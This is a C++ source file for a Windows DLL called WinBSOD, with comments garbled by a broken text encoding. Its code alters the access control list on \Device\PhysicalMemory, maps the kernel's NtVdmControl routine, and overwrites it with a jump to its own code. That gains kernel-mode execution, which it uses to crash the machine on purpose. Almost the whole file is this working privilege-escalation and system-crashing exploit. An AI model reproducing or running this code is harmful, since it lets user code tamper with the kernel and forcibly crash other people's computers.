// WinBSOD.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "WinBSOD.h"
#include "ring0.h"

#ifdef _MANAGED
#pragma managed(push, off)
#endif

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
    return TRUE;
}

#ifdef _MANAGED
#pragma managed(pop)
#endif


int bsod_type = 0;
BOOL BSODgo();

// This is an example of an exported function.
WINBSOD_API int WinBSOD(int _type)
{
	bsod_type = _type;
	BSODgo();
	return 0x00DEAD00;
}



//////////////////////////////////////////////////////////////////////////
// ������ʵ��

PVOID MapPhysicalMemory(HANDLE hSection, // �����ڴ��Section���
						DWORD Offset,    // ӳ����ʼƫ����������������ڴ��0��ַ
						DWORD CommitSize // ӳ�䷶Χ
						)
{
	NTSTATUS status;
	PVOID BaseAddress = NULL;
	LARGE_INTEGER PhysicalAddress = {Offset, 0};
	SIZE_T ViewSize = CommitSize;

	status = ZwMapViewOfSection(hSection, (HANDLE)-1, &BaseAddress, 0,
		CommitSize, &PhysicalAddress, &ViewSize, ViewShare, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) return NULL;

	return BaseAddress;
}
PVOID GetModuleBase(PCSTR name)
{
	NTSTATUS status;
	PVOID pBuffer, pModule;
	DWORD nRetSize, i, n;
	PSYSTEM_MODULE_INFORMATION pmi;

	pBuffer = LocalAlloc(LPTR, 0x1000);
	if (NULL == pBuffer)
	{
		return NULL;
	}

	status = ZwQuerySystemInformation(SystemModuleInformation, pBuffer, 0x1000, &nRetSize);
	if (STATUS_INFO_LENGTH_MISMATCH == status)
	{
		// ������̫С�����·���
		LocalFree(pBuffer);
		pBuffer = LocalAlloc(LPTR, nRetSize);
		if (NULL == pBuffer)
		{
			return NULL;
		}
		status = ZwQuerySystemInformation(SystemModuleInformation, pBuffer, nRetSize, &nRetSize);
	}
	if (!NT_SUCCESS(status))
	{
		LocalFree(pBuffer);
		return NULL;
	}

	pmi = (PSYSTEM_MODULE_INFORMATION)((DWORD)pBuffer + 4);
	n = *(PDWORD)pBuffer;
	pModule = NULL;

	// ����ָ����ģ��������ȡ��ַ
	for (i=0; i<n; i++)
	{
		if (!_stricmp(pmi->ImageName+pmi->ModuleNameOffset, name))
		{
			pModule = pmi->Base;
			break;
		}
		pmi++;
	}

	LocalFree(pBuffer);
	return pModule;
}

NTSTATUS Ring0Code(DWORD param1, DWORD param2) // ����������NtVdmControlһ�£���ƽ���ջ
{
	if (bsod_type == 0)
	{
		*((int*)0) = 0;
	}
	else if (bsod_type == 1)
	{
		int a = 1;
		a = a / (--a);
		return a;
	}
	return 0;
}

HANDLE OpenPhysicalMemory()
{
	DWORD dwRet;
	NTSTATUS status;
	UNICODE_STRING name;
	OBJECT_ATTRIBUTES oa;
	EXPLICIT_ACCESS ea;
	PSECURITY_DESCRIPTOR pSD = NULL;
	PACL pDacl = NULL;
	PACL pNewDacl = NULL;
	HANDLE hSection = NULL;
	HANDLE hSectionRet = NULL;

	RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");
	InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE, NULL, NULL);

	// �Կɶ�дSectionȨ�޴�PhysicalMemory
	status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);

	if (NT_SUCCESS(status)) goto FreeAndExit; // �򿪳ɹ���ֱ�ӷ���

	if (status != STATUS_ACCESS_DENIED)
	{
		// ���󣬵���Ȩ�޲��㣬��ʧ��
		hSectionRet = NULL;
		goto FreeAndExit;
	}

	// �Կɶ�дACLȨ�޴�PhysicalMemory
	status = ZwOpenSection(&hSection, READ_CONTROL | WRITE_DAC, &oa);
	if (!NT_SUCCESS(status)) goto FreeAndExit;

	// ��ȡPhysicalMemory��DACL
	dwRet = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
		NULL, NULL, &pDacl, NULL, &pSD);
	if (dwRet != ERROR_SUCCESS) goto FreeAndExit;

	// ����һ��ACE������ǰ�û���дPhysicalMemory
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = SECTION_MAP_READ | SECTION_MAP_WRITE;
	ea.grfAccessMode = GRANT_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
	ea.Trustee.ptstrName = TEXT("CURRENT_USER");

	// ���µ�ACE����DACL
	dwRet = SetEntriesInAcl(1, &ea, pDacl, &pNewDacl);
	if (dwRet != ERROR_SUCCESS) goto FreeAndExit;

	// ����PhysicalMemory��DACL
	dwRet = SetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
		NULL, NULL, pNewDacl, NULL);
	if (dwRet != ERROR_SUCCESS) goto FreeAndExit;

	// �ٴ��Կɶ�дȨ�޴�PhysicalMemory
	status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);
	if (!NT_SUCCESS(status)) goto FreeAndExit;

FreeAndExit:
	if (pSD) LocalFree(pSD);
	if (pNewDacl) LocalFree(pNewDacl);
	if (hSection) ZwClose(hSection);
	return hSectionRet;
}

BOOL BSODgo()
{
	DWORD dwTemp;
	LARGE_INTEGER liTemp = {0,0};
	char* Kernel	= "ntkrnlpa.exe";
	TCHAR* KernelW = TEXT("ntkrnlpa.exe");
	PVOID pKernel = NULL;
	HMODULE hKernel = NULL;
	HANDLE hSection = NULL;
	char *mapping = NULL;
	PVOID buffer	= NULL;
	DWORD offset;
	NTSTATUS status;
	char HookCode[24] = "\xE9\xDD\xDD\xDD\xDD"; // jmp 0xdddddddd ;Ring0Code

	PFNNTVDMCONTROL					pfnNtVdmControl = NULL;
	PFNMMGETPHYSICALADDRESS pfnMmGetPhysicalAddress = NULL;

	// ��ȡϵͳ����ģ��ntoskrnl.exe�Ļ�ַ
	pKernel = GetModuleBase(Kernel);

	// ���û�̬����һ��ntoskrnl.exe
	hKernel = LoadLibrary(KernelW);

	// ��ȡ�ں�����/�������û�̬�����λ��
	pfnNtVdmControl = (PFNNTVDMCONTROL)GetProcAddress(hKernel, "NtVdmControl");

	// �����ں�����/������ʵ�ʵ�ַ
	offset = (DWORD)pKernel - (DWORD)hKernel;
	dwTemp = (DWORD)pfnNtVdmControl;
	pfnNtVdmControl = (PFNNTVDMCONTROL)(dwTemp + offset);

	// ����HookCode
	*(PDWORD)(HookCode+1) = (DWORD)(Ring0Code) - (DWORD)pfnNtVdmControl - 5;

	// �������ڴ�Section
	hSection = OpenPhysicalMemory();

	// ӳ��NtVdmControl��ڸ������ڴ�
	offset = (DWORD)pfnNtVdmControl & 0x1FFFF000;   // ת���������ڴ�ҳ��ַ
	mapping = (char*)MapPhysicalMemory(hSection, offset, 0x2000);

	// ����NtVdmControl��ڴ���
	offset = (DWORD)pfnNtVdmControl & 0x00000FFF;   // ҳ��ƫ��

	memcpy(mapping+offset, HookCode, 24);   // �ҹ�NtVdmControl
	status = NtVdmControl(0, 0);  // ����NtVdmControl������Ring0

	return TRUE;
}
